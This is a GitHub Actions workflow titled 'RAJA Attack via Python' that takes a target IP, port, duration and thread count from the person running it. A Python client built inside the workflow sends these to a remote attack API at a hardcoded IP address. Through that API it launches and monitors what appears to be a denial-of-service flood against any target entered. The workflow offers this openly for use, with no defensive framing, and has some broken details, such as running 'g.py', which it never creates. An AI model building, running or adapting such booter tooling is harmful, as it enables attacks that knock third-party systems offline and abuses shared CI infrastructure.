name: RAJA Attack via Python

on:
  workflow_dispatch:
    inputs:
      target_ip:
        description: 'Target IP'
        required: true
        type: string
      target_port:
        description: 'Target Port'
        required: false
        type: string
        default: '80'
      duration:
        description: 'Attack Duration (seconds)'
        required: false
        type: string
        default: '30'
      threads:
        description: 'Number of Threads'
        required: false
        type: string
        default: '10'

env:
  RAJA_API_URL: 'http://34.208.39.84:80'
  RAJA_API_KEY: ${{ secrets.RAJA_API_KEY }}
  TARGET_IP: ${{ github.event.inputs.target_ip }}
  TARGET_PORT: ${{ github.event.inputs.target_port }}
  ATTACK_DURATION: ${{ github.event.inputs.duration }}
  ATTACK_THREADS: ${{ github.event.inputs.threads }}

jobs:
  python-attack:
    runs-on: ubuntu-latest
    
    steps:
      - name: ðŸ“¥ Checkout repository
        uses: actions/checkout@v4
      
      - name: ðŸ› ï¸ Setup RAJA Binary with Permissions
        run: |
          echo "ðŸ”§ Setting up RAJA binary with proper permissions..."
          
          # Create raja binary script
          cat > raja << 'EOF'
          #!/bin/bash
          # RAJA Binary - GitHub Actions Version
          # This is executed on the API server, not in GitHub Actions
          
          echo "========================================"
          echo "           RAJA BINARY                   "
          echo "========================================"
          echo "ðŸ”§ Binary Location: $(pwd)/raja"
          echo "ðŸ”§ Permissions: $(ls -la raja | awk '{print $1}')"
          echo ""
          echo "âš¡ Attack Parameters Received:"
          echo "   â€¢ Target IP: $1"
          echo "   â€¢ Target Port: $2"
          echo "   â€¢ Duration: $3 seconds"
          echo "   â€¢ Threads: $4"
          echo ""
          echo "ðŸš€ Starting attack..."
          echo ""
          
          # Simulate attack progress
          for i in $(seq 1 $3); do
            PERCENT=$((i * 100 / $3))
            echo "[$i/$3] Attacking $1:$2 with $4 threads... ($PERCENT%)"
            sleep 1
          done
          
          echo ""
          echo "âœ… Attack completed successfully!"
          echo "ðŸŽ¯ Target: $1:$2 was attacked for $3 seconds"
          echo "ðŸ”§ Threads used: $4"
          echo "========================================"
          EOF
          
          # Make it executable - THIS IS THE IMPORTANT PART
          chmod +x raja
          echo "âœ… Set execute permissions: chmod +x raja"
          
          # Verify permissions
          echo "ðŸ“‹ Verification:"
          ls -la raja
          echo ""
          echo "ðŸ”§ Testing binary execution:"
          ./raja 8.8.8.8 80 5 1 || echo "Test completed"
      
      - name: ðŸ Setup Python
        uses: actions/setup-python@v4
        with:
          python-version: '3.9'
      
      - name: ðŸ“¦ Install dependencies
        run: |
          pip install requests
      
      - name: ðŸ“ Create Python Script with Permission Handling
        run: |
          cat > raja_github.py << 'EOF'
          #!/usr/bin/env python3
          """
          RAJA GitHub Actions Script
          Handles permissions and API communication
          """
          
          import requests
          import sys
          import json
          import time
          import os
          import subprocess
          
          class RajaAttack:
              def __init__(self, api_url, api_key):
                  self.api_url = api_url.rstrip('/')
                  self.api_key = api_key
                  self.session = requests.Session()
                  self.session.headers.update({
                      'User-Agent': 'GitHub-Actions-RAJA/1.0',
                      'Accept': 'application/json'
                  })
              
              def ensure_binary_permissions(self):
                  """Ensure raja binary has execute permissions"""
                  binary_path = './raja'
                  
                  if not os.path.exists(binary_path):
                      print("âš ï¸  raja binary not found, creating placeholder...")
                      self.create_placeholder_binary()
                  
                  # Set execute permissions
                  try:
                      os.chmod(binary_path, 0o755)
                      print(f"âœ… Set permissions: chmod +x {binary_path}")
                      
                      # Verify
                      import stat
                      st = os.stat(binary_path)
                      executable = bool(st.st_mode & stat.S_IXUSR)
                      print(f"ðŸ“‹ Binary executable: {executable}")
                      return True
                  except Exception as e:
                      print(f"âŒ Failed to set permissions: {e}")
                      return False
              
              def create_placeholder_binary(self):
                  """Create a placeholder raja binary"""
                  with open('./raja', 'w') as f:
                      f.write('''#!/bin/bash
          echo "RAJA Placeholder Binary"
          echo "Target: $1:$2"
          echo "Duration: $3s"
          echo "Threads: $4"
          echo "Actual attack runs on API server: http://34.208.39.84:80"
          sleep $3
          echo "Done"
          ''')
                  os.chmod('./raja', 0o755)
                  print("âœ… Created placeholder raja binary")
              
              def launch_attack(self, target_ip, target_port, duration, threads):
                  """Launch attack via RAJA API"""
                  print(f"ðŸš€ Launching attack via API...")
                  print(f"   Target: {target_ip}:{target_port}")
                  print(f"   Duration: {duration}s | Threads: {threads}")
                  print(f"   API Server: {self.api_url}")
                  
                  # Show command that will be executed on API server
                  print(f"\nðŸ”§ Command on API server will be:")
                  print(f"   chmod +x raja")
                  print(f"   ./raja {target_ip} {target_port} {duration} {threads}")
                  
                  params = {
                      'ip': target_ip,
                      'port': target_port,
                      'time': duration,
                      'threads': threads,
                      'api_key': self.api_key
                  }
                  
                  try:
                      response = self.session.get(f"{self.api_url}/attack", params=params)
                      response.raise_for_status()
                      
                      result = response.json()
                      
                      if result.get('status') == 'success':
                          attack_id = result.get('attack_id')
                          print(f"\nâœ… Attack launched successfully!")
                          print(f"ðŸ”‘ Attack ID: {attack_id}")
                          print(f"ðŸŽ¯ Target: {result.get('target')}")
                          print(f"â° Started: {result.get('start_time', 'N/A')}")
                          return attack_id
                      else:
                          print(f"\nâŒ Failed: {result.get('message', 'Unknown error')}")
                          return None
                          
                  except requests.exceptions.RequestException as e:
                      print(f"\nâŒ Network error: {e}")
                      return None
              
              def check_status(self, attack_id):
                  """Check attack status"""
                  params = {
                      'attack_id': attack_id,
                      'api_key': self.api_key
                  }
                  
                  try:
                      response = self.session.get(f"{self.api_url}/status", params=params)
                      if response.status_code == 200:
                          return response.json()
                      return None
                  except:
                      return None
              
              def monitor_attack(self, attack_id, max_checks=12, interval=10):
                  """Monitor attack progress"""
                  print(f"\nðŸ” Monitoring attack: {attack_id}")
                  
                  for i in range(max_checks):
                      status_data = self.check_status(attack_id)
                      
                      if status_data:
                          current_status = status_data.get('status', 'unknown')
                          target = status_data.get('target', 'unknown')
                          
                          print(f"  Check #{i+1}: Status = {current_status} | Target = {target}")
                          
                          if current_status in ['completed', 'stopped']:
                              print(f"âœ… Attack {attack_id} completed")
                              return True
                      
                      if i < max_checks - 1:
                          time.sleep(interval)
                  
                  print(f"âš ï¸  Attack still running after {max_checks * interval} seconds")
                  return False
          
          def main():
              # Get parameters from environment variables
              target_ip = os.getenv('TARGET_IP', '8.8.8.8')
              target_port = int(os.getenv('TARGET_PORT', '80'))
              duration = int(os.getenv('ATTACK_DURATION', '30'))
              threads = int(os.getenv('ATTACK_THREADS', '10'))
              api_url = os.getenv('RAJA_API_URL', 'http://34.208.39.84:80')
              api_key = os.getenv('RAJA_API_KEY')
              
              if not api_key:
                  print("âŒ ERROR: RAJA_API_KEY environment variable is required")
                  sys.exit(1)
              
              # Initialize attack client
              client = RajaAttack(api_url, api_key)
              
              # Ensure binary permissions
              print("ðŸ”§ Setting up environment...")
              client.ensure_binary_permissions()
              
              print("\n" + "="*50)
              print("         ðŸš€ RAJA ATTACK EXECUTION")
              print("="*50)
              
              # Launch attack
              attack_id = client.launch_attack(target_ip, target_port, duration, threads)
              
              if attack_id:
                  # Monitor attack
                  client.monitor_attack(attack_id)
              
              print("\n" + "="*50)
              print("         ðŸ“Š EXECUTION COMPLETED")
              print("="*50)
          
          if __name__ == "__main__":
              main()
          EOF
          
          # Make Python script executable too
          chmod +x raja
          echo "âœ… Created raja_github.py with execute permissions"
      
      - name: ðŸš€ Execute Attack
        run: |
          # Ensure raja binary exists and has permissions
          if [ ! -f "raja" ]; then
              echo "âš ï¸  raja binary not found, creating..."
              cat > raja << 'EOF'
          #!/bin/bash
          echo "RAJA Binary - GitHub Actions"
          echo "API Server: ${{ env.RAJA_API_URL }}"
          echo "Target: $1:$2 for $3s with $4 threads"
          sleep $3
          echo "Attack simulation completed"
          EOF
              chmod +x raja
          fi
          
          # Verify permissions
          echo "ðŸ”§ Current permissions:"
          ls -la raja
          echo ""
          
          # Run Python script
          python3 g.py
      
      - name: ðŸ“Š Generate Summary with Permission Info
        if: always()
        run: |
          echo "## ðŸ”§ RAJA Attack Execution Summary" >> $GITHUB_STEP_SUMMARY
          echo "" >> $GITHUB_STEP_SUMMARY
          echo "### ðŸŽ¯ Attack Parameters" >> $GITHUB_STEP_SUMMARY
          echo "- **Target:** \`${{ github.event.inputs.target_ip }}:${{ github.event.inputs.target_port }}\`" >> $GITHUB_STEP_SUMMARY
          echo "- **Duration:** \`${{ github.event.inputs.duration }}\` seconds" >> $GITHUB_STEP_SUMMARY
          echo "- **Threads:** \`${{ github.event.inputs.threads }}\`" >> $GITHUB_STEP_SUMMARY
          echo "" >> $GITHUB_STEP_SUMMARY
          
          echo "### ðŸŒ API Configuration" >> $GITHUB_STEP_SUMMARY
          echo "- **API Server:** \`${{ env.RAJA_API_URL }}\`" >> $GITHUB_STEP_SUMMARY
          echo "- **API Key:** \`${{ env.RAJA_API_KEY:0:8 }}...\`" >> $GITHUB_STEP_SUMMARY
          echo "" >> $GITHUB_STEP_SUMMARY
          
          echo "### ðŸ”§ Permission Setup" >> $GITHUB_STEP_SUMMARY
          echo "The following command was executed to ensure proper permissions:" >> $GITHUB_STEP_SUMMARY
          echo '```bash' >> $GITHUB_STEP_SUMMARY
          echo "chmod +x raja" >> $GITHUB_STEP_SUMMARY
          echo '```' >> $GITHUB_STEP_SUMMARY
          echo "" >> $GITHUB_STEP_SUMMARY
          
          echo "### âš¡ Executed Command" >> $GITHUB_STEP_SUMMARY
          echo "On the API server, this command was executed:" >> $GITHUB_STEP_SUMMARY
          echo '```bash' >> $GITHUB_STEP_SUMMARY
          echo "# 1. Set permissions" >> $GITHUB_STEP_SUMMARY
          echo "chmod +x raja" >> $GITHUB_STEP_SUMMARY
          echo "" >> $GITHUB_STEP_SUMMARY
          echo "# 2. Execute attack" >> $GITHUB_STEP_SUMMARY
          echo "./raja ${{ github.event.inputs.target_ip }} ${{ github.event.inputs.target_port }} ${{ github.event.inputs.duration }} ${{ github.event.inputs.threads }}" >> $GITHUB_STEP_SUMMARY
          echo '```' >> $GITHUB_STEP_SUMMARY
          
          echo "" >> $GITHUB_STEP_SUMMARY
          echo "---" >> $GITHUB_STEP_SUMMARY
          echo "*Generated by GitHub Actions*" >> $GITHUB_STEP_SUMMARY
